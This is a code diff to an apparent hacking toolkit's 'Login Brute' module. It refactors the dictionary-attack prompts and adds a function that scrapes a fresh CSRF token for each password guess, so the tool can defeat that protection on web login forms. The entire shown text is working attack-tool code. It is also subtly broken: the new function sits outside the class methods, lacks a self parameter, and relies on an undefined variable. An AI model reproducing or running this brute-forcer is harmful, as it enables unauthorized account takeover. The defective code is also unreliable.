@@ -1577,9 +1577,27 @@ class ADMF():
 #Login Brute =====================================
 class LOG():
 
+def get_csrf_token(url, csrf_field):
+    time_stamp = time.time()
+    date_time = datetime.fromtimestamp(time_stamp)
+    str_date_time = date_time.strftime("%H:%M:%S")
+    result = requests.get(url)
+    tree = html.fromstring(result.text)
+    sys.stdout.write("\r" + whitespace)
+    sys.stdout.write(W + "\r[" + BO + str_date_time + W + "]" + O +
+                     " ~> Trying to Fetch a token...")
+    _token = ""
+    try:
+      _token = list(
+        set(tree.xpath("//input[@name='" + csrf_field + "']/@value")))[0]
+    except Exception as es:
+      pass
+    return _token
+
   def main(self):
     try:
       csrf = 0
+      _csrf = 0
       os.system(clrcmd)
       print(banner)
       print(f"{W}[{BR}@{W}]{BG} Login Brute{W}")
@@ -1589,51 +1607,36 @@ class LOG():
       _input = _input.replace(" ", "" )
 
       if "-csrf" in _input:
+        _csrf = 1
         _input = _input.replace("-csrf", "" )
-        target = _input
-        os.system(clrcmd)
-        print(banner)
-        print(f"{W}[{BR}@{W}]{BG} Login Brute [CSRF Token]{W}")
-        print(f"{W} ├─[{BO}Target{W}] {P}{target}")
-        user = str(input(f"{W} ├─[{BO}Username{W}]{PINK} "))
-        passwd = str(input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{PINK} "))
-        if passwd == "" or passwd == " ":
-          passwd = "./src/passwords.txt"
+
+      target = _input
+      os.system(clrcmd)
+      print(banner)
+      print(f"{W}[{BR}@{W}]{BG} Login Brute{W}")
+      print(f"{W} ├─[{BO}Target{W}] {P}{target}")
+      user = str(input(f"{W} ├─[{BO}Username{W}]{PINK} "))
+      passwd = str(input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{PINK} "))
+      if passwd == "" or passwd == " ":
+        passwd = "./src/passwords.txt"
+      else:
+        if not os.path.isfile(passwd) and not os.access(passwd, os.R_OK):
+          input(f"{error}{BR} File Does Not Exists!")
+          self.main()
         else:
-          if not os.path.isfile(passwd) and not os.access(passwd, os.R_OK):
-            input(f"{error}{BR} File Does Not Exists!")
-            self.main()
-          else:
-            passwd = passwd
-        user_field = str(input(f"{W} ├─[{BO}User Field{W}]{BB} "))
+          passwd = passwd
+      user_field = str(input(f"{W} ├─[{BO}User Field{W}]{BB} "))
+        
+
+      if _csrf == 1:
         password_field = str(input(f"{W} ├─[{BO}Pass Field{W}]{BB} "))
         csrf_field = str(input(f"{W} └─[{BO}CSRF Token{W}]{BG} "))
         csrf = 1
-
-        self.run(target, user, passwd, user_field, password_field, csrf_field, csrf)
-
       else:
-        target = _input
-        os.system(clrcmd)
-        print(banner)
-        print(f"{W}[{BR}@{W}]{BG} Login Brute{W}")
-        print(f"{W} ├─[{BO}Target{W}] {P}{target}")
-        user = str(input(f"{W} ├─[{BO}Username{W}]{PINK} "))
-        passwd = str(input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{PINK} "))
-        if passwd == "" or passwd == " ":
-          passwd = "./src/passwords.txt"
-        else:
-          if not os.path.isfile(passwd) and not os.access(passwd, os.R_OK):
-            input(f"{error}{BR} File Does Not Exists!")
-            self.main()
-          else:
-            passwd = passwd
-        user_field = str(input(f"{W} ├─[{BO}User Field{W}]{BB} "))
         password_field = str(input(f"{W} └─[{BO}Pass Field{W}]{BB} "))
-        csrf_field = "None"
-        csrf = 0
+        csrf_field = str("None")
 
-        self.run(target, user, passwd, user_field, password_field, csrf_field, csrf)
+      self.run(target, user, passwd, user_field, password_field, csrf_field, csrf)
 
     except KeyboardInterrupt:
       cancel()
@@ -1684,7 +1687,7 @@ class LOG():
           cnt = W+"["+BO+str(count)+'/'+totalwordlist+W+"]"
 
           if csrf == 1:
-            payload = {user_field: user,password_field: pwd.replace('\n', ''),csrf_field: _csrf_token}
+            payload = {user_field: user,password_field: pwd.replace('\n', ''),csrf_field: self.get_csrf_token(url, csrf_field)}
 
           else:
             payload = {user_field: user,password_field: pwd.replace('\n', '')}
